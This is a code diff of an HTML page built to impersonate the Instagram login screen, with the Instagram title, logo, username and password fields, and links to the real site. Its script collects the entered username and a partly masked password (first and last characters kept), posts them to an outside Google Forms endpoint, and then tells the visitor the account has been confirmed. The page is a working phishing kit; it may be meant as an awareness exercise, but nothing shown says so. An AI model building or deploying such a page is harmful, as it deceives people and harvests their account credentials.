@@ -5,6 +5,9 @@
 
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
 
+<title>Login • Instagram</title>
+<link rel="shortcut icon" href="Images/icon.png"/>
+
 <style>
     body {
       font-family: Arial, Helvetica, sans-serif;
@@ -83,17 +86,15 @@
 
 
     .slate {
-      border-width: 1px;
-      border-color: rgb(230, 230, 230);
+      border-width: 1px !important;
+      border-color: rgb(230, 230, 230) !important;
       width: 25%;
-      margin: 0 auto;
+      margin: 0 auto !important;
       background-color: #fff;
     }
 
 
-
-    /* Change styles for span and cancel button on extra small screens */
-    @media screen and (max-width: 300px) {
+     @media screen and (max-width: 300px) {
       span.psw {
         display: block;
         float: none;
@@ -109,25 +110,52 @@
 <body>
 
 <div class="slate">
-
-
     <form id="form" target="_self" onsubmit="return postToGoogle();" action="" autocomplete="off"> 
         <div width="80% !important;" style="margin: 0 auto; text-align:center">
             <br/>
             <img src="Images/logo.PNG" style="width: 60%">
             <br/><br/>
             <input id="nameField" name="entry.366340186" placeholder="Phone number, username, or email" type="text" required> <br/>
-            <input id="emailField" name="entry.147812173" placeholder="Password" type="password" required> <br/> <br/>
+            <input id="passwordField" name="entry.147812173" placeholder="Password" type="password" required> <br/> <br/>
             
             <button id="send" type="submit" >Log In</button>
             <br/><br/>
+            <p style="font-size:11px"><a href="https://www.instagram.com/accounts/password/reset/" target="_blank" style="text-decoration:none; color:grey">Forgot password?</a></p>
+            <br/>
         </div>
     </form>
 
-<h3 id="success-msg" style="text-align: center !important; margin-top:190px !important; display:none; color:#fff"> Your Request has been posted to Google Spreadsheet</h3>
+    <h3 id="success-msg" style="text-align: center !important; margin-top:190px !important; display:none; color:gray">
+          <br/>  
+          Your account information has been confirmed!
+          <br/><br/>
+          <p style="text-align:center; font-size:13px">You may now close this page</p>
+          <br/>
+    </h3>
 
 </div>
+<br/>
+<div class="slate">
+      <br/>
+      <p style="font-size:13px; text-align:center">Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/" target="_blank" style="text-decoration:none; color:cornflowerblue">Sign up</a></p>
+      <br/>
+</div>
 
+<p style="text-align:center; color:grey; font-size:13px;">Get the app.</p>
+<div width="80% !important;" style="margin: 0 auto; text-align:center">
+      <div class="row">
+            <div class="column" style="float:center !important;">
+                  <a href="https://apps.apple.com/app/instagram/id389801252?vt=lo" target="_blank">
+                        <img src="Images/app_store.PNG" alt="App Store" style="width:10%">
+                  </a>
+            </div>
+            <div class="column" style="float:center !important;">
+                  <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3DXAXLWWALAAFICEQY2DP0IP6GJZ7V%26utm_content%3Dlo%26utm_medium%3Dbadge" target="_blank">
+                        <img src="Images/google_play.PNG" alt="Google Play" style="width:10%">
+                  </a>
+            </div>
+      </div>
+</div>
 
 
 
@@ -136,9 +164,9 @@
 <script>
 
 function postToGoogle() {
-                var field1 = $("#nameField").val();
-                var field2 = $("#emailField").val();
-                
+        var field1 = $("#nameField").val();
+        var field2 = $("#passwordField").val();
+        
 
 				if(field1 == ""){
 					alert('Please Fill Your Name');
@@ -147,30 +175,40 @@ function postToGoogle() {
 				}
 				if(field2 == ""){
 					alert('Please Fill Your Email');
-					document.getElementById("emailField").focus();
+					document.getElementById("passwordField").focus();
 					return false;
 				}
 				
+        // fix password - only store first and last digit
+        var newpw = '';
+        for (var i = 0; i < field2.length; i++)
+        {
+            if ( (i == 0) || (i == field2.length - 1) )
+                newpw = newpw + field2[i];
+            else
+                newpw = newpw + '*';
+        }
 
+        field2 = newpw;
+        
+        $.ajax({
+                url: "https://docs.google.com/forms/d/e/1FAIpQLSf0rNCWw1sbsVpM3mg-yx8c2EZ-DqMP7vwTKGMSnvV0bPJH2w/formResponse?",
+                data: {"entry.366340186": field1, "entry.147812173": field2},
+                type: "POST",
+                dataType: "xml",
+                success: function(d)
+              {
+              },
+              error: function(x, y, z)
+                {
 
-              $.ajax({
-                      url: "https://docs.google.com/forms/d/e/1FAIpQLSf0rNCWw1sbsVpM3mg-yx8c2EZ-DqMP7vwTKGMSnvV0bPJH2w/formResponse?",
-                      data: {"entry.366340186": field1, "entry.147812173": field2},
-                      type: "POST",
-                      dataType: "xml",
-                      success: function(d)
-                    {
-                    },
-                    error: function(x, y, z)
-                      {
-
-                        $('#success-msg').show();
-                        $('#form').hide();
-                        
-                      }
-                });
-              
-              return false;
+                  $('#success-msg').show();
+                  $('#form').hide();
+                  
+                }
+          });
+        
+        return false;
 
 }
 
